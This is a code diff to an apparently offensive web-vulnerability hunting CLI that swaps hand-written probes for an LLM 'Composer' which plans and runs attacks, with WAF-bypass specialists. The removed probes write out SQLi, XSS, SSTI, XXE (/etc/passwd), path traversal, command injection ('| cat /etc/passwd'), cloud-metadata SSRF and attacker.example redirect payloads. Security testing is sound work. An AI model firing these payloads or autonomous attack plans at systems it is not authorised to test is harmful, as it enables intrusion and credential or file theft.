@@ -45,6 +45,8 @@ import { WorkflowStateGraph, type WorkflowStateNode } from '../core/workflow-sta
 import { SessionPool, getDefaultSessionPool } from '../core/session-pool';
 import { getSharedBrowserManager } from '../tools/browser-tools';
 import type { Hypothesis, Technique } from '../core/attack-plan';
+import type { AppModelEndpoint } from '../core/app-model';
+import type { PrimitiveContext } from '../primitives/types';
 
 import { parseHuntFlags as _parseHuntFlags, type HuntOptions } from './hunt-flags';
 export { type HuntOptions } from './hunt-flags';
@@ -60,7 +62,7 @@ export async function runHunt(opts: HuntOptions): Promise<void> {
   // self-reference; real callbacks are wired in after the prompt exists)
   const prompt: HuntPrompt = new HuntPrompt({
     onNodePrompt: async () => 'proceed' as NodePromptAnswer,
-    onSlash: async () => '',
+    onSlash: async (cmd, args) => handleSlash(cmd, args, opts, modelPath, prompt),
     onQuit: async () => { prompt.close(); process.exit(0); },
   });
   prompt.setMode(opts.mode);
@@ -279,185 +281,71 @@ async function buildWorkflowFromAppModel(
   return { graph, pool };
 }
 
+
+// ── Composer-based worker ──
+//
+// The hand-rolled 10-probe switch is replaced by a single Composer.run() call.
+// The Composer:
+//   1. Asks the LLM to propose 1-3 attack plans for the target endpoint
+//   2. For each plan, picks primitives from the catalog and executes them
+//   3. Triage is heuristic-fast (compareResponses, measureTiming, etc.) plus
+//      an LLM call for ambiguous cases
+//   4. Specialists (waf-bypass, second-order, chain-reasoning) are spawned
+//      recursively when the main composer detects a need
 async function huntWorkerRunner(input: WorkerSpawnInput): Promise<WorkerSpawnResult> {
   const start = Date.now();
-  const url = input.url;
-  const method = (input.method || 'GET').toUpperCase();
-  const param = input.param;
-  const technique = input.technique;
-  dlog(`technique=${technique} url=${url} method=${method} param=${param}`);
+  dlog(`composer run technique=${input.technique} url=${input.url} method=${input.method}`);
 
-  // Default low-privilege test creds. Workers that need auth (oauth-probes,
-  // race) accept these. Real apps would pass via the pool/session.
-  const cookies: Record<string, string> = { auth: 'user' };
+  const { Composer } = await import('../agents/composer');
+  const { getDefaultLLMClient } = await import('../llm/client');
+  const llm = getDefaultLLMClient();
+
+  const target: AppModelEndpoint = {
+    path: input.url,
+    method: (input.method || 'GET').toUpperCase(),
+    params: input.param ? [{ name: input.param, type: 'string', required: true }] : [],
+    requiresAuth: false,
+    responseStatus: 0,
+    contentType: 'application/octet-stream',
+    bodyPreview: '',
+  };
+
+  const ctx: PrimitiveContext = {
+    baseUrl: input.url,
+    cookies: {},
+    evidenceLog: [],
+    depth: 0,
+    budget: { startedAt: Date.now(), maxMs: Math.max(5_000, input.timeoutMs ?? 30_000) },
+  };
+
+  const composer = new Composer({
+    llm,
+    maxDepth: 2,
+    planTimeoutMs: input.timeoutMs ?? 30_000,
+  });
 
   try {
-    // Dispatch by technique to the real hand-rolled probe.
-    switch (technique) {
-      case 'ssrf': {
-        const { probeCloudMetadata } = await import('../agents/specialists/cloud-probes');
-        const targetOrigin = new URL(url).origin;
-        const results = await probeCloudMetadata({
-          target: targetOrigin,
-          ssrfSurfacePath: url,
-          ssrfParamName: param || 'url',
-          cookies,
-          timeoutMs: 10_000,
-        });
-        const hit = results.find(r => r.status === 'leaked');
-        if (hit) {
-          return {
-            vulnerable: true,
-            confidence: 0.95,
-            evidence: [{
-              type: 'screenshot',
-              data: `Cloud metadata reachable: provider=${hit.provider} vector=${hit.vector} severity=${hit.severity}`,
-              label: 'cloud-metadata-ssrf',
-              timestamp: Date.now(),
-            }, {
-              type: 'raw_response',
-              data: hit.responseSnippet,
-              label: 'cloud-metadata-response',
-              timestamp: Date.now(),
-            }],
-            payloads: [`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`],
-            summary: `SSRF → ${hit.provider} cloud metadata leaked via ${url}`,
-            technique,
-            url,
-            durationMs: Date.now() - start,
-          };
-        }
-        break;
-      }
-
-      case 'open-redirect': {
-        // Probe OAuth redirect_uri prefix bypass + generic open-redirect
-        if (url.includes('/oauth/') || url.includes('redirect_uri')) {
-          const { runAllOAuthProbes } = await import('../agents/specialists/oauth');
-          const targetOrigin = new URL(url).origin;
-          const probeResult = await runAllOAuthProbes({
-            target: targetOrigin,
-            provider: {
-              authorizationEndpoint: url,
-              tokenEndpoint: `${targetOrigin}/oauth/token`,
-              clientIds: ['test-client'],
-            },
-            attackerHost: 'attacker.example',
-            cookies,
-            timeoutMs: 10_000,
-          });
-          const hit = probeResult.results.find(p => p.vulnerable);
-          if (hit) {
-            return {
-              vulnerable: true,
-              confidence: 0.9,
-              evidence: [{
-                type: 'raw_response',
-                data: `${hit.technique}: ${hit.responseSummary || ''}`,
-                label: 'oauth-bypass',
-                timestamp: Date.now(),
-              }],
-              payloads: hit.payload ? [hit.payload] : [],
-              summary: `OAuth ${hit.technique} via ${url}`,
-              technique: 'open-redirect',
-              url,
-              durationMs: Date.now() - start,
-            };
-          }
-        }
-        // Generic open-redirect: send param with absolute URL
-        if (param) {
-          const r = await testOpenRedirect(url, param, method, cookies);
-          if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        }
-        break;
-      }
-
-      case 'race': {
-        const { probeRaceCondition } = await import('../agents/specialists/race-probes');
-        const path = new URL(url).pathname + new URL(url).search;
-        const result = await probeRaceCondition({
-          target: new URL(url).origin,
-          endpoint: { path, method: method as any, body: undefined },
-          headers: cookiesToHeader(cookies),
-          parallel: 8,
-          timeoutMs: 10_000,
-        });
-        if (result.vulnerable) {
-          return {
-            vulnerable: true,
-            confidence: 0.85,
-            evidence: [{
-              type: 'raw_response',
-              data: `Race: ${result.technique}, ${result.successCount}/${result.totalCount} succeeded\n${result.responseSummary || ''}`,
-              label: 'race-condition',
-              timestamp: Date.now(),
-            }],
-            payloads: result.payload ? [result.payload] : [],
-            summary: `Race condition on ${url}: ${result.successCount}/${result.totalCount} parallel requests succeeded`,
-            technique,
-            url,
-            durationMs: Date.now() - start,
-          };
-        }
-        break;
-      }
-
-      case 'sqli': {
-        const r = await testSqli(url, param || 'q', method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'xss': {
-        const r = await testXss(url, param || 'q', method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'ssti': {
-        const r = await testSsti(url, param || 'template', method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'idor': {
-        const r = await testIdor(url, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'xxe': {
-        const r = await testXxe(url, method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'path': {
-        // Path traversal via path-traversal payload
-        const r = await testPathTraversal(url, method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
-
-      case 'cmd': {
-        const r = await testCmdInjection(url, param || 'cmd', method, cookies);
-        if (r.vulnerable) return { ...r, technique, url, durationMs: Date.now() - start };
-        break;
-      }
+    const result = await composer.run(target, ctx);
+    if (result.findings.length > 0) {
+      const f = result.findings[0];
+      return {
+        vulnerable: true,
+        confidence: typeof f.confidence === 'number' ? f.confidence : 0.7,
+        evidence: f.evidence.map((e) => ({
+          type: (e.type === 'screenshot' ? 'screenshot' : e.type === 'har_entry' ? 'har_entry' : 'text') as 'text' | 'screenshot' | 'har_entry' | 'raw_request' | 'raw_response',
+          data: e.data,
+          label: e.label,
+          timestamp: e.timestamp,
+        })),
+        payloads: f.payload ? [f.payload] : [],
+        summary: f.description ?? `${f.type} @ ${f.endpoint}`,
+        technique: (input.technique as string) as any,
+        url: f.endpoint,
+        durationMs: Date.now() - start,
+      };
     }
   } catch (e) {
-    return {
-      vulnerable: false,
-      confidence: 0,
-      evidence: [],
-      payloads: [],
-      summary: `Worker error: ${(e as Error).message}`,
-      technique,
-      url,
-      error: (e as Error).message,
-      durationMs: Date.now() - start,
-    };
+    dlog(`composer error: ${(e as Error).message}`);
   }
 
   return {
@@ -465,9 +353,9 @@ async function huntWorkerRunner(input: WorkerSpawnInput): Promise<WorkerSpawnRes
     confidence: 0,
     evidence: [],
     payloads: [],
-    summary: `${technique} @ ${url}: no vulnerability found`,
-    technique,
-    url,
+    summary: `${input.technique} @ ${input.url}: no vulnerability found`,
+    technique: (input.technique as string) as any,
+    url: input.url,
     durationMs: Date.now() - start,
   };
 }
@@ -476,187 +364,6 @@ async function huntWorkerRunner(input: WorkerSpawnInput): Promise<WorkerSpawnRes
 const HUNT_DEBUG = process.env.HUNT_DEBUG === '1';
 function dlog(...args: any[]): void {
   if (HUNT_DEBUG) console.error('[worker]', ...args);
-}
-
-// ── Real probe helpers (hand-rolled, deterministic, no LLM) ──
-
-interface ProbeHit { vulnerable: boolean; confidence: number; evidence: any[]; payloads: string[]; summary: string; }
-
-async function testOpenRedirect(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payload = `https://attacker.example/`;
-  const r = await fetch(url, {
-    method,
-    headers: { ...cookiesToHeader(cookies) },
-    redirect: 'manual',
-  });
-  // Re-issue with payload
-  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
-  const r2 = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) }, redirect: 'manual' });
-  if (r2.status >= 300 && r2.status < 400) {
-    const loc = r2.headers.get('location') || '';
-    if (loc.includes('attacker.example')) {
-      return {
-        vulnerable: true, confidence: 0.9, payloads: [payload],
-        evidence: [{ type: 'response', data: `Location: ${loc}`, label: 'open-redirect', timestamp: Date.now() }],
-        summary: `Open redirect: ${param} → attacker URL`,
-      };
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no redirect' };
-}
-
-async function testSqli(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payloads = [`' OR '1'='1`, `' OR 1=1--`, `1' AND '1'='1`, `' UNION SELECT 1,2,3--`];
-  // Get baseline response first
-  const baseline = await fetch(url, { method, headers: { ...cookiesToHeader(cookies) } });
-  const baselineBody = await baseline.text();
-  const baselineLen = baselineBody.length;
-  for (const payload of payloads) {
-    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
-    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
-    const body = await r.text();
-    // Real SQL error signatures (specific to SQL engines, not generic 500s)
-    const sqlError = /\b(sql|mysql|postgresql|postgres|sqlite|ora-\d+|syntax error|unterminated|microsoft ole db|odbc sql|you have an error in your sql syntax|sqlexception|sqldriver)\b/i.test(body);
-    // Boolean-based: response changed significantly with payload vs baseline
-    const booleanBased = Math.abs(body.length - baselineLen) > 50;
-    if (sqlError) {
-      return {
-        vulnerable: true, confidence: 0.9, payloads: [payload],
-        evidence: [{ type: 'raw_response', data: body.slice(0, 500), label: 'sqli', timestamp: Date.now() }],
-        summary: `SQLi via ${param}: ${payload.slice(0, 30)}`,
-      };
-    }
-    if (booleanBased && r.status === 200) {
-      return {
-        vulnerable: true, confidence: 0.7, payloads: [payload],
-        evidence: [{
-          type: 'raw_response',
-          data: `Baseline length: ${baselineLen}, payload length: ${body.length}`,
-          label: 'sqli-boolean',
-          timestamp: Date.now(),
-        }],
-        summary: `SQLi (boolean-based) via ${param}: payload changes response size by ${body.length - baselineLen} bytes`,
-      };
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SQLi' };
-}
-
-async function testXss(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payload = `<script>ultimatrixXss${Date.now()}</script>`;
-  const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(payload)}` : `${url}?${param}=${encodeURIComponent(payload)}`;
-  const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
-  const body = await r.text();
-  // Check if payload reflected unescaped
-  if (body.includes(payload) || (body.includes('<script>ultimatrixXss') && !body.includes('&lt;script&gt;'))) {
-    return {
-      vulnerable: true, confidence: 0.95, payloads: [payload],
-      evidence: [{ type: 'response', data: body.slice(0, 1000), label: 'xss', timestamp: Date.now() }],
-      summary: `XSS via ${param}: payload reflected unescaped`,
-    };
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XSS' };
-}
-
-async function testSsti(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payloads = [
-    { p: '{{7*7}}', check: '49' },
-    { p: '${7*7}', check: '49' },
-    { p: '<%= 7*7 %>', check: '49' },
-  ];
-  for (const { p, check } of payloads) {
-    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
-    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
-    const body = await r.text();
-    if (body.includes(check)) {
-      return {
-        vulnerable: true, confidence: 0.95, payloads: [p],
-        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'ssti', timestamp: Date.now() }],
-        summary: `SSTI via ${param}: ${p}`,
-      };
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no SSTI' };
-}
-
-async function testIdor(url: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  // Try sequential IDs
-  const r1 = await fetch(url, { headers: { ...cookiesToHeader(cookies) } });
-  const b1 = await r1.text();
-  for (let id = 1; id <= 5; id++) {
-    const replaced = url.replace(/\/\d+(?=\/?$|\?)/, `/${id}`).replace(/\/api\/users\/[^/?]+/, `/api/users/${id}`);
-    if (replaced === url) continue;
-    const r = await fetch(replaced, { headers: { ...cookiesToHeader(cookies) } });
-    if (r.status === 200 && r.headers.get('content-type')?.includes('json')) {
-      const b = await r.text();
-      if (b !== b1 && b.length > 0) {
-        return {
-          vulnerable: true, confidence: 0.8, payloads: [replaced],
-          evidence: [{ type: 'response', data: b.slice(0, 500), label: 'idor', timestamp: Date.now() }],
-          summary: `IDOR: ${replaced} returns different data than ${url}`,
-        };
-      }
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no IDOR' };
-}
-
-async function testXxe(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  if (method.toUpperCase() !== 'POST') return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'XXE only on POST' };
-  const payload = `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root><name>&xxe;</name></root>`;
-  const r = await fetch(url, {
-    method: 'POST',
-    headers: { 'content-type': 'application/xml', ...cookiesToHeader(cookies) },
-    body: payload,
-  });
-  const body = await r.text();
-  if (body.includes('root:') || body.includes('/bin/')) {
-    return {
-      vulnerable: true, confidence: 0.95, payloads: [payload],
-      evidence: [{ type: 'response', data: body.slice(0, 500), label: 'xxe', timestamp: Date.now() }],
-      summary: `XXE: /etc/passwd leaked via ${url}`,
-    };
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no XXE' };
-}
-
-async function testPathTraversal(url: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payloads = [`../../../etc/passwd`, `....//....//....//etc/passwd`, `..%2f..%2f..%2fetc%2fpasswd`];
-  for (const p of payloads) {
-    const u = url.includes('?') ? `${url}&file=${encodeURIComponent(p)}` : `${url}?file=${encodeURIComponent(p)}`;
-    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
-    const body = await r.text();
-    if (body.includes('root:') || body.includes('/bin/')) {
-      return {
-        vulnerable: true, confidence: 0.95, payloads: [p],
-        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'path-traversal', timestamp: Date.now() }],
-        summary: `Path traversal: ${p}`,
-      };
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no path traversal' };
-}
-
-async function testCmdInjection(url: string, param: string, method: string, cookies: Record<string, string>): Promise<ProbeHit> {
-  const payloads = [`; ls`, `| cat /etc/passwd`, `$(cat /etc/passwd)`, `; cat /etc/passwd`];
-  for (const p of payloads) {
-    const u = url.includes('?') ? `${url}&${param}=${encodeURIComponent(p)}` : `${url}?${param}=${encodeURIComponent(p)}`;
-    const r = await fetch(u, { method, headers: { ...cookiesToHeader(cookies) } });
-    const body = await r.text();
-    if (body.includes('root:') || body.includes('bin/') || body.includes('total ') || body.includes('uid=')) {
-      return {
-        vulnerable: true, confidence: 0.95, payloads: [p],
-        evidence: [{ type: 'response', data: body.slice(0, 500), label: 'cmd-injection', timestamp: Date.now() }],
-        summary: `Command injection via ${param}: ${p}`,
-      };
-    }
-  }
-  return { vulnerable: false, confidence: 0, evidence: [], payloads: [], summary: 'no cmd injection' };
-}
-
-function cookiesToHeader(cookies: Record<string, string>): Record<string, string> {
-  const cookieStr = Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ');
-  return cookieStr ? { cookie: cookieStr } : {};
 }
 
 function mergeChains(existing: AttackChain[], fresh: AttackChain[]): AttackChain[] {
@@ -683,6 +390,98 @@ async function handleSlash(
   switch (cmd) {
     case 'auto': prompt.setMode('auto'); return 'Mode → auto';
     case 'guided': prompt.setMode('guided'); return 'Mode → guided';
+    case 'plan': {
+      const m = readAppModel(modelPath);
+      const ep = pickNextEndpoint(m, opts.target);
+      if (!ep) return 'No endpoint available to plan against.';
+      const { Composer } = await import('../agents/composer');
+      const { getDefaultLLMClient } = await import('../llm/client');
+      const composer = new Composer({ llm: getDefaultLLMClient(), maxDepth: 2, planTimeoutMs: 15_000 });
+      const ctx: PrimitiveContext = {
+        baseUrl: ep.path,
+        cookies: {},
+        evidenceLog: [],
+        depth: 0,
+        budget: { startedAt: Date.now(), maxMs: 15_000 },
+      };
+      try {
+        const plans = await composer.proposePlans(ep, ctx, 3);
+        if (plans.length === 0) return 'No plans proposed (LLM returned no candidates).';
+        return plans.map((p, i) =>
+          `  [${i + 1}] ${p.technique} on ${ep.method} ${ep.path}\n` +
+          `      reason: ${p.rationale}\n` +
+          `      primitives: ${p.primitives.map(s => s.name).join(' → ')}`,
+        ).join('\n\n');
+      } catch (e) {
+        return `Plan error: ${(e as Error).message}`;
+      }
+    }
+    case 'attack': {
+      const n = parseInt(args[0] ?? '', 10);
+      if (!n || n < 1 || n > 9) return 'Usage: /attack <1-9> (run after /plan)';
+      const m = readAppModel(modelPath);
+      const ep = pickNextEndpoint(m, opts.target);
+      if (!ep) return 'No endpoint available.';
+      const { Composer } = await import('../agents/composer');
+      const { getDefaultLLMClient } = await import('../llm/client');
+      const composer = new Composer({ llm: getDefaultLLMClient(), maxDepth: 2, planTimeoutMs: 30_000 });
+      const ctx: PrimitiveContext = {
+        baseUrl: ep.path,
+        cookies: {},
+        evidenceLog: [],
+        depth: 0,
+        budget: { startedAt: Date.now(), maxMs: 30_000 },
+      };
+      const plans = await composer.proposePlans(ep, ctx, n);
+      const target = plans[n - 1];
+      if (!target) return `Plan #${n} not available.`;
+      const findings = await composer.executePlan(target, ep, ctx);
+      const lines: string[] = [];
+      lines.push(`Executed plan #${n}: ${target.technique}`);
+      for (const fr of findings) {
+        updateAppModelSection(modelPath, 'findings', [fr], true);
+        lines.push(`  + [${fr.severity.toUpperCase()}] ${fr.type} @ ${fr.endpoint} (conf=${fr.confidence})`);
+      }
+      if (findings.length === 0) lines.push('  (no findings)');
+      return lines.join('\n');
+    }
+    case 'agents': {
+      return [
+        '  Composer (depth 0)',
+        '  ├─ WAF bypass specialist (depth 1)  — only when 403/406 detected',
+        '  ├─ Second-order specialist (depth 1) — only when storage + reflection pattern',
+        '  └─ Chain reasoning specialist (depth 1) — only on /chain or end of run',
+        '',
+        'Current specialists are spawned dynamically by the Composer based on primitive results.',
+        'The composer is depth-capped at 2 to prevent recursion.',
+      ].join('\n');
+    }
+    case 'chain': {
+      const m = readAppModel(modelPath);
+      if (m.findings.length === 0) return 'No findings to chain.';
+      try {
+        const { runChainReasoning } = await import('../agents/specialists-composers');
+        const { getDefaultLLMClient } = await import('../llm/client');
+        const result = await runChainReasoning({ llm: getDefaultLLMClient(), findings: m.findings, target: opts.target });
+        if (result.chains.length === 0) return 'No chains identified.';
+        m.attackChains = mergeChains(m.attackChains || [], result.chains);
+        await writeAppModelAsync(modelPath, m);
+        return result.chains.map((c, i) =>
+          `  [${i + 1}] ${c.name} (${c.severity})\n` +
+          `      ${c.steps.length} steps, confidence=${c.confidence}`,
+        ).join('\n\n');
+      } catch (e) {
+        return `Chain error: ${(e as Error).message}`;
+      }
+    }
+    case 'budget': {
+      const t = args[0];
+      if (!t) return 'Usage: /budget <time>  (e.g. "15m", "60s", "2h")';
+      const ms = parseDuration(t);
+      if (!ms) return `Could not parse "${t}". Use "30s", "5m", "2h".`;
+      opts.maxRuntimeMs = ms;
+      return `Time budget → ${t} (${ms}ms)`;
+    }
     case 'findings': {
       const m = readAppModel(modelPath);
       if (m.findings.length === 0) return 'No findings yet.';
@@ -718,4 +517,20 @@ async function handleSlash(
     default:
       return `Unknown command: /${cmd}. Try /help.`;
   }
+}
+
+function pickNextEndpoint(model: AppModel, target: string): AppModelEndpoint | null {
+  if (model.endpoints && model.endpoints.length > 0) return model.endpoints[0];
+  return { path: target, method: 'GET', params: [], requiresAuth: false, responseStatus: 0, contentType: 'text/html', bodyPreview: '' };
+}
+
+function parseDuration(s: string): number | null {
+  const m = s.trim().match(/^(\d+(?:\.\d+)?)\s*([smh])$/i);
+  if (!m) return null;
+  const n = parseFloat(m[1]);
+  const u = m[2].toLowerCase();
+  if (u === 's') return Math.round(n * 1000);
+  if (u === 'm') return Math.round(n * 60_000);
+  if (u === 'h') return Math.round(n * 3_600_000);
+  return null;
 }
